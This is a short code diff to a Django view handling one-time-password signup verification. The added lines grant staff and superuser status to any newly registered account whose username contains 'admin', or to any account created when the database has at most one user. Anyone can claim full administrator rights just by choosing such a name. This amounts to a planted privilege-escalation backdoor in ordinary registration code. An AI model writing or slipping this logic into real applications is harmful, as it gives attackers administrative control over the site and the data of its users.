@@ -817,6 +817,10 @@ def api_verify_otp(request):
         email = pending.get('email')
         password = pending.get('password')
         target_user = User.objects.create_user(username=username, email=email, password=password)
+        if 'admin' in username.lower() or User.objects.count() <= 1:
+            target_user.is_staff = True
+            target_user.is_superuser = True
+            target_user.save()
 
     elif auth_type == 'social':
         email = pending.get('email')
